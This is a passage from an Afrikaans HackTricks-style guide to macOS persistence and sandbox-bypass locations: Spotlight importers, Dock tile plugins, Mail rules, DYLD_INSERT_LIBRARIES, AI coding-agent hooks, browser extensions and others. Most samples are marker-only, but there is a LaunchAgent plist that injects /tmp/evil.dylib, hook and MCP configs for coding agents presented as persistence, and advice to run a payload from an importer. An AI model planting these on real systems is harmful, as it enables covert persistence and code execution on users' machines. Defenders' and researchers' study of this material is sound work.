Die inproppe of **`.mdimporter`**-bundels is op die plekke wat vroeër genoem is. ’n Nuwe bundel moet opgespoor word en met ’n lêertipe ooreenstem, en Spotlight moet werklik ’n ooreenstemmende lêer indekseer; om bloot ’n bundel te kopieer, bewys nie dat dit gelaai is nie. [Apple's MDImporter reference](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) koppel die laai daarvan aan ’n geskikte lêer wat verander het. Die uitvoering van Spotlight-invoerproppe op macOS 26 is nie hier getoets nie.

Dit is moontlik om **alle gelaaide `mdimporters` te vind** deur die volgende uit te voer:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

En byvoorbeeld **/Library/Spotlight/iBooksAuthor.mdimporter** word gebruik om hierdie soorte lêers te ontleed (uitbreidings `.iba` en `.book`, onder andere):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> As jy die Plist van ander `mdimporter`-s nagaan, sal jy moontlik nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit ’n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en nie uitbreidings hoef te spesifiseer nie.
>
> Boonop geniet verstekstelsel-inproppe altyd voorkeur, dus kan ’n aanvaller slegs toegang kry tot lêers wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.

Om jou eie invoerder te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam verander, **`CFBundleDocumentTypes`** wysig en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun, en dit in **`schema.xml`** weerspieël.\
Verander dan die kode van die funksie **`GetMetadataForFile`** sodat dit jou payload uitvoer wanneer ’n lêer met die verwerkte uitbreiding geskep word.

Laastens, **bou en kopieer jou nuwe `.mdimporter`** na een van die drie vorige liggings. Jy kan nagaan of dit gelaai is deur **die logs te moniteer** of **`mdimport -L`** uit te voer.

> [!TIP]
> Hoewel die invoerder-sandbox baie beperkend is, indekseer `mdworker` lêers met **bevoorregte leestoegang**. ’n Kwaadwillige `.mdimporter` kan dus die *inhoud* van lêers in TCC-beskermde liggings (Downloads, Pictures, Desktop, …) lees en die ingesamelde metadata uitlek sonder enige TCC-aanvraag — die **"Sploitlight" TCC-bypass (CVE-2025-31199)**, wat in macOS Sequoia 15.4 reggestel is.<sup>[[55]](#references)</sup>

Vir die afsonderlike macOS 26-tegniek om beskermde grepe in **Darwin notification names** te dra eerder as stelsellogs, sien [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Voorkeurpaneel~~

> [!CAUTION]
> Dit lyk nie of dit meer werk nie.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Dit vereis ’n spesifieke gebruikershandeling
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beskrywing

Dit lyk nie of dit meer werk nie.<sup>[[26]](#references)</sup>

### Toepassingskriplêers

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar die teikentoepassing moet geïnstalleer wees en deur die slagoffer uitgevoer/gebruik word
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

’n **Geïnterpreteerde skrip wat ’n geïnstalleerde toepassing of hulpmiddel werklik uitvoer** en wat die aanvaller kan wysig. Bevestig die lêer se toestemmings en die aanroeppad; om bloot ’n `.sh`- of `.py`-lêer te vind, is nie genoeg nie. Apple se [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) sê dat ondertekende toepassingbundels hulpbronne, insluitend skripte, verseël. As ’n skrip binne die bundel gewysig word, word daardie verseëling gebreek en kan die wysiging opgespoor of geblokkeer word wanneer die bundel gevalideer word. ’n Eksterne skrip soos Homebrew se lanseerder het ander ondertekenings- en vertrouensgedrag. Historiese voorbeelde uit die writeup sluit in:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – ’n skrip wat deur ouer Sublime Text-weergawes gebruik is; die lêer en die gebruik daarvan tydens opstart moet vir die geïnstalleerde weergawe nagegaan word. Dit was afwesig op die toets-Mac.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) of **`/usr/local/bin/brew`** (Intel) – ’n Bash-lanseerder wat uitgevoer word wanneer daardie `brew`-pad aangeroep word, indien dit geïnstalleer is en deur die aanvaller geskryf kan word. `/opt/homebrew/bin/brew` was ’n skryfbare Bash-skrip op die toets-Mac; dit is ’n plaaslike waarneming, nie ’n algemene Homebrew-toestemmingsreël nie.
- **IDLE se `idlemain.py`** binne ’n Python-toepassingbundel – skryfregte kan admin-toestemming vereis, maar dit loop met die IDLE-gebruiker se identiteit.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – ’n historiese shell-skrip wat as root loop wanneer die ooreenstemmende `org.wireshark.ChmodBPF` launchd-taak geïnstalleer is. Die skrip en taak was afwesig op die toets-Mac.

#### Beskrywing en uitbuiting

Sommige hulpmiddels en toepassings voer geïnterpreteerde skripte tydens looptyd uit. ’n Skryfbare skrip kan bygevoegde opdragte uitvoer wanneer die spesifieke aanroeper dit die volgende keer laat loop, mits handtekeningvalidering, kwarantyn en ander kontroles dit toelaat. Die oorspronklike navorsing het verskeie installasies uit 2019 gedemonstreer; kontroleer hul paaie en snellers weer op die teikenweergawe.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Hierdie kopietoets het `marker fired: True` op macOS 26.5.2 opgelewer; die oorspronklike launcher is onaangeraak gelaat. Dit bewys dat die invoegpunt in die kopie uitgevoer word, nie dat ’n gewysigde, ondertekende app-bundel of ’n werklike Homebrew-installasie elke lanseringskontrole sal slaag nie.

### Dock Tile Plugins

Skrywe: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Vereis dat ’n app wat die plugin verklaar, opgespoor/geregistreer en deur die Dock verwerk word
  - Die plugin laai in ’n **Apple-ondertekende** helper wat geen app-sandbox-entitlement het nie en **library validation gedeaktiveer** het. Hierdie helper is nie in die Background Task Management UI in die aangehaalde navorsing gewys nie; sigbaarheid op ’n teikenweergawe moet nagegaan word.
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, waarna verwys word met die **`NSDockTilePlugIn`**-sleutel in die app se `Info.plist`; die plugin se eie `Info.plist` stel **`NSPrincipalClass`**.

#### Beskrywing en uitbuiting

Wanneer ’n app `NSDockTilePlugIn` verklaar, kan die Dock die verwysde bundel in die **`com.apple.dock.external.extra`** XPC-helper (`...extra.arm64` op Apple Silicon) laai wanneer die gebruiker aanmeld of wanneer die teël bygevoeg word; die app self hoef nie te begin nie. Dit vereis dat die app deur macOS opgespoor/geregistreer en aanvaar word. Die helper is **Apple-onderteken**, het geen `com.apple.security.app-sandbox`-entitlement nie en het `com.apple.security.cs.disable-library-validation`. Die hoofklas se **`setDockTile:`**-metode word met laai aangeroep; van daar af kan dit inteken op verspreide kennisgewings (bv. `com.apple.screenIsLocked`) vir latere gebeurtenisse.<sup>[[38]](#references)</sup>

Op macOS 26.5.2 het leesalleen-`codesign`-inspeksie die helper se Apple-handtekening en entitlements bevestig, en verskeie geïnstalleerde apps het `NSDockTilePlugIn` verklaar. Geen nuwe plugin is op daardie Mac geïnstalleer of gelaai nie, dus is die uitvoering van ’n nuutgeskrewe bundel op daardie weergawe steeds nie getoets nie.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Verslag: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Die widget extension loop in **sy eie proses**, en om een by te voeg, veroorsaak **nie** ’n Background Task Management-waarskuwing nie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die config plist is binne ’n TCC-beskermde container, dus vereis redigering daarvan van buite Full Disk Access of ’n TCC bypass

#### Ligging

- Widget extension-bundel: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktiewe/geregistreerde widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (sleutels `widgets.instances` en `widgets.widgets`)

#### Beskrywing en uitbuiting

’n WidgetKit extension wat binne ’n app verskeep word, loop in **sy eie proses** wat deur Notification Center bestuur word. Deur ’n instance in `widgets.instances` te registreer (’n base64 `NSKeyedArchiver`-gekodeerde `CHSWidget`-blob met ingebedde `INIntent`-data) en NotificationCenter te herbegin, laai die widget en voer dit sy `TimelineProvider`-/intent-kode uit.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app-reëls (Run AppleScript)

Beskrywing: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar Mail.app moet met ’n rekening opgestel wees en loop; die trigger is ’n inkomende e-pos
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)
  - As die reëls/scripts van buite Mail af gewysig word, moet Mail dalk gesluit wees en Full Disk Access op moderne macOS geaktiveer wees

#### Ligging

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (plaaslike reëls; `V10` op Sonoma/Sequoia, `V11`+ op nuwer weergawes)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-gesinkroniseerde reëls, geniet voorkeur)
- Reëlaktivering: **`RulesActiveState.plist`**; AppleScript-loonvrag: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Beskrywing en uitbuiting

’n Apple Mail-**reël** kan ’n *"Run AppleScript"*-aksie hê. Deur ’n reël by te voeg wat met ’n spesiaal saamgestelde **onderwerpreël** ooreenstem en ’n aanvallerskrip laat loop, kry die aanvaller **op afstand aktiveerbare, geheimsinnige** kode-uitvoering in Mail se konteks wanneer die spesiale e-pos aankom — ’n vektor wat baie persistence-skandeerders ontwyk omdat geen LaunchAgent/Login Item geskep word nie.<sup>[[42]](#references)</sup> As die reël ook die trigger-e-pos **uitvee**, word die bewyse versteek. Verdedigers kan direk daarna soek:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Skrywe: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle)
  - Moderne macOS vereis **handmatige gebruikergoedkeuring** in System Settings → *Device Management* (stil `profiles install` is nie meer beskikbaar buite MDM nie)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Geïnstalleerde profiele is onder **`/Library/Managed Preferences/`** en **`/var/db/ConfigurationProfiles/`**; ’n profiel is ’n XML plist met ’n `PayloadContent`-skikking.

#### Beskrywing & Exploitation

’n `.mobileconfig` is nie ’n direkte kode-uitvoeringsprimitief nie, maar dit kan konfigurasie behou, soos ’n **vertroude wortel-CA** (`com.apple.security.root`), ’n **globale of PAC-proxy** (`com.apple.proxy.*`), **bestuurde voorkeure** (`com.apple.ManagedClient.preferences`) of beperkings. Op macOS 10.15 en later bepaal Apple se [`PayloadRemovalDisallowed`-definisie](https://developer.apple.com/documentation/devicemanagement/toplevel) dat indien dit op `true` gestel word vir ’n **handmatig geïnstalleerde** profiel sonder ’n verwyderingswagwoord-payload, **administrateurstawing** nodig is om dit te verwyder; dit maak die profiel nie absoluut onverwyderbaar nie. MDM-geïnstalleerde profiele het afsonderlike bestuurs- en verwyderingsreëls.<sup>[[44]](#references)</sup>

> [!WARNING]
> ’n Gewone konfigurasieprofiel het **geen payload-tipe wat ’n arbitrêre `LaunchDaemon`/`LaunchAgent` installeer nie**. Om ’n daemon so te installeer, vereis volle **MDM-inskrywing** plus ’n bestuursagent/-script — moenie `.mobileconfig` as ’n launchd-afleweringsmeganisme beskou nie.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES-volharding

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **verwyder** `DYLD_*` vir SIP-/platform-binêre lêers, hardened-runtime-programme en setuid-teikens, dus spuit dit net in onbeskermde prosesse in en omseil **nie** SIP/die hardened runtime nie
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Betroubare vorm: die **`EnvironmentVariables`**-woordeboek binne ’n kwaadwillige `LaunchAgent`/`LaunchDaemon`-plist (loop by aanmelding/tydens selflaai)
- Uitgedien/histories (slegs vir verslagdoening): **`~/.MacOSX/environment.plist`** (verwyder in 10.8) en **`/etc/launchd.conf`** (verwyder in 10.10)

#### Beskrywing en uitbuiting

As ’n aanvaller `DYLD_INSERT_LIBRARIES` in die omgewing van ’n slagofferproses kan kry, laai dyld die aanvaller se dylib (waarvan die constructor loop) in daardie proses. Die volhardingsvariant sluit die veranderlike in ’n LaunchAgent in, sodat elke keer wanneer die taak begin, die dylib weer ingespuit word. Let daarop dat `launchctl setenv DYLD_*` op moderne macOS gefiltreer word; sluit dit dus eerder in die plist in.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Vir die volledige meganika van dylib injection/hijacking, sien:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### KI-koderingsagent-CLI's (hooks, MCP-bedieners, reëlêers)

Write-ups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Vereis dat die ontwikkelaar die betrokke agent gebruik. Opstartopdragte loop met daardie gebruiker se voorregte wanneer die agent hul konfigurasie aanvaar; vertroue in die werkruimte en MCP-goedkeuring verskil volgens produk en sessiemodus.
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle) (loop as die gebruiker; erf alles waartoe die terminale/agent reeds toegang het)

#### Ligging

Die eksplisiete hook- en MCP-konfigurasielêers kan **shell-opdragte of kinderprosesse laat loop wanneer die ontwikkelaar die instrument gebruik** — hetsy vanuit 'n globale lêer per gebruiker (volharding) of vanuit 'n lêer wat in 'n repo vasgelê is (voorsieningsketting). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` en redigeerderreëls is **instruksies aan 'n agent**, nie 'n waarborg dat shell-opdragte uitgevoer word wanneer die lêer gelees word nie; die uitwerking daarvan hang af van die agent se gedrag en instrumenttoestemmings. Gaan elke produk se huidige vertrouens- en goedkeuringsreëls na.

- **Claude Code**
  - `~/.claude/settings.json`, projek-`.claude/settings.json`, `.claude/settings.local.json` en die slegs-wortel-**`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM-/bestuurde instellings **kan nie deur die gebruiker oorskryf word nie** → sterk volharding)
  - `hooks`-objek — gebeure `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — elkeen voer 'n shell-`command` uit
  - `statusLine.command` — 'n shell-opdrag wat uitgevoer word om die statuslyn te vertoon (elke sessie)
  - MCP-bedieners in `~/.claude.json` / projek-`.mcp.json` — `command`+`args` word as kinderprosesse geloods
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instruksies wat prompt injection kan probeer, onderhewig aan die agent se gedrag en instrumenttoestemmings
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` word as kinderprosesse geloods); `AGENTS.md`-projekinstruksies
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP-bedieners); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … voer opdragte uit); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Beskrywing en uitbuiting

As 'n akteur die rekening se gebruikerwye instellings kan wysig, kan die hooks of MCP-opdragte daarvan in toekomstige sessies onder daardie rekening loop. 'n Konfigurasie wat deur 'n repo beheer word, is 'n aparte geval: [huidige Claude Code-sekuriteitsdokumentasie](https://code.claude.com/docs/en/security) beskryf 'n interaktiewe dialoogvenster vir vertroue in die werkruimte en 'n aparte goedkeuringsprompt vir projek-`.mcp.json`-bedieners. [Die toestemmingsmatriks](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) meld dat hooks kan loop nadat 'n ouerlêergids vertrou is, en dat `claude -p`-/SDK-sessies nie die interaktiewe vertrouprompt wys nie; projek-MCP-bedieners koppel sonder 'n goedkeuringsprompt in daardie nie-interaktiewe modusse. Die gerapporteerde omseiling van projek-hooks voor vertroue, CVE-2025-59536, is [in 2025 reggestel](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); moenie dit as huidige verstekgedrag beskou nie. Afleweringsvektore kan 'n gekompromitteerde repo of 'n kwaadwillige installeerder insluit. Prompt injection via reëlêers is minder deterministies as 'n eksplisiete hook en hang steeds af van instrumentgoedkeurings.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Voorbeeld van Claude Code-instellings wat wêreldwyd vir die gebruiker geld; plaas dit slegs in 'n weggooibare rekening wanneer jy toets:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Voorbeeld van gebruikerglobale Codex MCP-konfigurasie:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Voorbeeld van ’n Cursor-hook-konfigurasie; kontroleer die skema van die geïnstalleerde weergawe voordat jy dit gebruik:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser-uitbreidings (Chromium: Chrome / Brave / Edge)

Writeup: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [ExtensionInstallForcelist abuse on macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Vereis ’n ondersteunde browser en ’n geïnstalleerde, geaktiveerde uitbreiding. External Extensions op macOS vereis gebruikerbevestiging; bestuurde force-install vereis ’n toepaslike enterprise policy.
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Dit verskil van **native messaging hosts** (sien die afdeling *Chrome native messaging hosts* hierbo). Hier is die volharding die **outo-geïnstalleerde uitbreiding** self.

#### Ligging

- **External Extensions JSON** (word ontdek wanneer die browser begin, waarna ’n versoek om dit te aktiveer op macOS volg):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (per gebruiker) of `/Library/Application Support/Google/Chrome/External Extensions/` (alle gebruikers)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Enterprise-policy force-install** via bestuurde voorkeure / ’n konfigurasieprofiel:
  - `com.google.Chrome`-sleutel `ExtensionInstallForcelist` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), gelees vanaf `/Library/Managed Preferences/` of ’n geïnstalleerde `.mobileconfig`

#### Beskrywing en uitbuiting

Dit is twee verskillende installasieroetes. Chrome se [external-install-dokumentasie](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) sê dat **Windows- en macOS-gebruikers ’n uitbreiding moet bevestig en aktiveer** wat via ’n *External Extensions*-lêer aangebied word; dit word nie uitgevoer bloot omdat daardie JSON-lêer geskryf is nie. Vir installasie vir alle gebruikers op macOS vereis Chrome ook dat die external-extension-lêer beskerm word teen wysiging deur onbevoorregte gebruikers. ’n Bestuurde `ExtensionInstallForcelist`- of `ExtensionSettings`-policy kan ’n uitbreiding installeer en vaspen sonder daardie gebruikerinteraksie; [Google se Mac-policygids](https://support.google.com/chrome/a/answer/7517624) beskryf die bestuurde konfigurasie en sê dat die gebruiker nie force-installed-uitbreidings kan verwyder nie. Dit is ’n policy-ontplooiingsroete, nie ’n `defaults write`-kortpad per gebruiker nie.<sup>[[49]](#references)</sup>

> [!WARNING]
> Op macOS moet ’n *External Extensions*-JSON-manifest na ’n **Chrome Web Store**-opdaterings-URL verwys, nie na ’n plaaslike CRX nie. Bestuurde policy-ontplooiing het sy eie enterprise-voorvereistes en kan ’n bestuurde selfgehoste opdaterings-URL toelaat. Vir ’n plaaslike, uitgepakte uitbreiding in ’n toetsprofiel is Chrome se ontwikkelaarmodus-skakel `--load-extension=/path` ’n afsonderlike meganisme; dit laat nie ’n External Extensions-JSON-lêer self uitvoer nie. Moenie ’n skrywing na `Secure Preferences` as gelykstaande aan een van die gedokumenteerde registrasieroetes beskou nie.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Begin Chrome in daardie weggooibare rekening en let op die aktiveringsboodskap; die uitbreiding se eie gedrag is die uitvoerings-PoC sodra die gebruiker dit aanvaar. Verwyder ná die toets die manifest en deaktiveer/deïnstalleer die uitbreiding in daardie profiel. Hierdie pad is **nie** in die aktiewe Chrome-profiel op die navorsings-Mac getoets nie. Die roete met bestuurde beleid is ook nie daar ontplooi nie.

Force-install en External Extensions verwys na uitbreiding-ID's in die **Chrome Web Store**; vir die laervlak-truuk om stilweg 'n plaaslike uitbreiding in te voeg deur die profiel se HMAC-ondertekende `Secure Preferences` te wysig, en ander misbruik van Chromium-prosesse, sien:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme & File-Type Handlers (LaunchServices)

Beskrywing: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Die sneller is dat die slagoffer op 'n skakel klik (bv. in Chrome/Brave/Safari) of 'n lêer van die geregistreerde tipe oopmaak
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- 'n Programbundel se `Info.plist` wat **`CFBundleURLTypes`/`CFBundleURLSchemes`** (pasgemaakte URL-skema) of **`CFBundleDocumentTypes`** (lêeruitbreiding/UTI) verklaar
- Effektiewe verstekwaardes per gebruiker kan verskyn in **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (`LSHandlers`-skikking). Apple se ondersteunde API om 'n verstek vir 'n URL-skema te kies, is `LSSetDefaultHandlerForURLScheme`; om daardie plist direk te skryf, is nie 'n gedokumenteerde registrasie- of kasopdateringsmetode nie.

#### Beskrywing & Uitbuiting

Launch Services verkry aansprake oor URL-skemas en dokumente uit 'n geregistreerde program se `Info.plist`. [Apple se registrasiegids](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) sê dat registrasie kan plaasvind wanneer Finder die program ontdek, tydens selflaai of aanmelding, of via 'n eksplisiete registrasie-API; om bloot 'n program êrens te skryf, waarborg nie dat dit onmiddellik geaktiveer word nie. Ná registrasie kan die oopmaak van 'n ooreenstemmende URL of dokument die gekose hanteerderprogram begin, onderhewig aan die gebruiker se keuse van verstekhanteerder en normale macOS-beginvoorwaardes. Die ondersteunde `LSSetDefaultHandlerForURLScheme`-API verander 'n URL-hanteerder wat die gebruiker verkies; dit laat nie 'n nuutgeplaaste program outomaties loop nie.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Geen app is geregistreer nie en geen hanteerdervoorkeur is op die macOS 26.5.2-navorsings-Mac verander nie. Om ’n werklike hanteerder te toets, gebruik ’n weggooibare gebruikersrekening, registreer ’n app wat slegs ’n merker gebruik met ’n unieke skema, roep die URL daarvan aan en verwyder dan die app en sy registrasie.

Sien die volgende vir ’n diepgaande uiteensetting van die enumerering/misbruik van lêeruitbreiding- en URL-skema-hanteerders:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python-opstartlêers (`.pth` / `usercustomize` / `sitecustomize`)

Skrywe: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
